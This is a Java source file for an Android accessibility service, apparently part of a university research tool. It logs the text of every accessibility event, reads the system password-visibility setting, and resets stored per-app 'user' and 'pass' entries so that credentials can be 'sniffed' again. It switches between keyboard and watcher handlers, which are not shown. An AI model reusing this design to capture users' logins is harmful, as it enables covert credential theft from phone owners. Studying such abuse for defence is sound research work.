package de.fau.i1.aka.avt.Services;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.HashSet;

import de.fau.i1.aka.avt.Accessibility.AccessibilityState;
import de.fau.i1.aka.avt.Accessibility.AccessibilityStateEnum;
import de.fau.i1.aka.avt.Accessibility.AccessibilityStateManager;

/**
 * Created by Anatoli Kalysch (anatoli.kalysch@fau.de), Department of Computer Science, Friedrich-Alexander University Erlangen-Nuremberg, on 10.11.17.
 */

public class AccessibilityServiceSM extends AccessibilityService {

    private static final String TAG = "AccServ";

    private AccessibilityState accessibilityState;
    public static final boolean debug = true;
    // pref name
    public static final String SHARED_PREFS = "de.fau.i1.aka.avt.prefs";

    // sniffing related preferences
    public static final String PREFS_SNIFFED_PACKAGE_NAMES = "sniffed_package_names";
    public static final String PREFS_SNIFFED_PACKAGE_NAMES_KEYBOARD = "keyboard_sniff";
    public static final String PREFS_KEYBOARD_ENABLED = "accessibilityKeyboard";

    public SharedPreferences queryPreferences() {
        return getSharedPreferences(SHARED_PREFS, MODE_PRIVATE);
    }


    public void setAccessibilityState(AccessibilityState accessibilityState) {
        this.accessibilityState = accessibilityState;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.i(String.valueOf(event.getEventType()), event.getText().toString());
        this.accessibilityState.handleEvent(event);
    }

    @Override
    public void onInterrupt() {}

    //Configure the Accessibility Service
    @Override
    public void onServiceConnected() {
        String secPrefs = Settings.System.getString(getContentResolver(), Settings.System.TEXT_SHOW_PASSWORD);
        // set the packages user and pass values to null so they can be sniffed again
        for (String passPackageName : queryPreferences().getStringSet(PREFS_SNIFFED_PACKAGE_NAMES, new HashSet<String>())) {
            queryPreferences().edit().putString(passPackageName + "user", null).apply();
            queryPreferences().edit().putString(passPackageName + "pass", null).apply();
        }

//        queryPreferences().edit().putStringSet(PREFS_SNIFFED_PACKAGE_NAMES, null).apply();
        //TODO:remove
        queryPreferences().edit().putBoolean(PREFS_KEYBOARD_ENABLED, false).apply();
        if (!queryPreferences().getBoolean(PREFS_KEYBOARD_ENABLED, false))
            this.accessibilityState = AccessibilityStateManager.getInstance().rebuildHandler(AccessibilityStateEnum.KEYBOARD, this);
        else
            this.accessibilityState = AccessibilityStateManager.getInstance().rebuildHandler(AccessibilityStateEnum.WATCHER, this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

}
